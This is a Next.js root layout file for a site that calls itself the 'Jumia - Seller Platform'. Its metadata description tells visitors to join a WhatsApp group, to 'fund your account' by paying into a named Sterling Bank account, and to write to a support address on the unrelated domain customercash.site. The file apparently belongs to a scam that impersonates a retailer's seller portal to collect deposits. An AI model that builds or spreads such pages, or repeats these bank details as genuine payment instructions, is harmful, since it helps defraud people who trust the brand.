import type { Metadata } from "next";
import "./globals.css";

export const metadata: Metadata = {
  title: "Jumia - Seller Platform",
  description: "Jumia Seller Platform: Manage orders, track commissions, and process withdrawals." + 
  "Please join our WhatsApp group for support: https://chat.whatsapp.com/+2349138042802" + 
  " To fund your account, please use the following bank details: Account Name: Flutterwave/Jumia NG, Bank: Sterling Bank, Account Number: 8523569562. For any inquiries, contact us at support@customercash.site",
  
  icons: {
    icon: "/Logohh.jpeg",
  },
};

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en">
      <body>{children}</body>
    </html>
  );
}
